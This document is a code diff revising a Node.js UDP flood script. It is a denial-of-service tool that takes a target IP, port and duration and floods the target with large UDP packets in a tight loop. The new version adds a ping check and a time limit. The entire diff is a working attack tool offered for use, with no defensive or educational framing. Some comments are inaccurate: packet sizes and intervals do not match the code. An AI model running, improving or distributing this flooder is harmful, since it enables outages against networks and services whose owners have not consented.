@@ -1,36 +1,61 @@
-const dgram = require("dgram");
+const dgram = require('dgram');
+const ping = require('ping');
+const process = require('process');
 
-// Ambil argumen dari CLI
-const target_ip = process.argv[2]; // IP Target
-const target_port = parseInt(process.argv[3]); // Port Target
-const duration = parseInt(process.argv[4]); // Durasi Serangan (detik)
-
-if (!target_ip || !target_port || !duration) {
-    console.log("Usage: node udp_flood.js <IP> <Port> <Duration>");
-    process.exit(1);
+// Command-line arguments validation
+if (process.argv.length !== 5) {
+    console.log("Usage: node udpFlood.js <target-ip> <port> <duration>");
+    process.exit(-1);
 }
 
-const packet_size = 65507; // MAX UKURAN UDP (65507 Bytes)
-const socket = dgram.createSocket("udp4");
-const packet = Buffer.alloc(packet_size, "X"); // Isi Paket Acak
+const targetIP = process.argv[2]; // Target IP address
+const targetPort = process.argv[3]; // Target port
+const duration = parseInt(process.argv[4]); // Duration of the attack in seconds
 
-console.log(`🔥 Starting UDP Flood → Target: ${target_ip}:${target_port} | Packet Size: ${packet_size} Bytes | Duration: ${duration}s 🔥`);
+const message = Buffer.from('A'.repeat(6224)); // 1KB message for each UDP packet
 
-const startTime = Date.now();
-const endTime = startTime + duration * 1000;
+let attackInterval; // Reference to interval for clearing later
 
-function sendPacket() {
-    if (Date.now() > endTime) {
-        console.log("✅ Attack Finished!");
-        process.exit(0);
-    }
-
-    socket.send(packet, 0, packet.length, target_port, target_ip, (err) => {
-        if (err) console.error("Send Error:", err);
-    });
-
-    setImmediate(sendPacket); // Loop Tanpa Delay
+// Function to initiate the UDP flood attack
+function udpFlood() {
+    const client = dgram.createSocket('udp4');
+    
+    attackInterval = setInterval(() => {
+        // Send UDP packet to target IP and port
+        client.send(message, 0, message.length, targetPort, targetIP, (err) => {
+            if (err) {
+                console.error('Error sending packet:', err);
+            }
+        });
+    }, 0); // Send packets every 10ms
 }
 
-// Mulai Serangan
-sendPacket();
+// Function to ping the target and stop the attack if a response is received
+function pingKill() {
+    const pingInterval = setInterval(() => {
+        ping.sys.probe(targetIP, function(isAlive) {
+            if (isAlive) {
+                console.log(`Ping response received from ${targetIP}. Stopping the UDP flood attack.`);
+                clearInterval(attackInterval);
+                clearInterval(pingInterval);
+                process.exit(0); // Exit the process after receiving the ping response
+            } else {
+                console.log(`No ping response from ${targetIP}. Continuing attack...`);
+            }
+        });
+    }, 0); // Ping every 5 seconds
+}
+
+// Start the UDP Flood and Ping Kill
+udpFlood();
+pingKill();
+
+// Log status
+console.log(`\x1b[33m[\x1b[33m!\x1b[37m]\x1b[33m Starting UDP flood to ${targetIP}:${targetPort} for ${duration} seconds.`);
+
+// Stop the flood after the specified duration
+setTimeout(() => {
+    console.log('\x1b[31m[!] Flood attack finished due to time limit!');
+    clearInterval(attackInterval); // Stop the attack
+    process.exit(0); // Exit after attack duration
+}, duration * 1000); // Stop after the specified duration in seconds
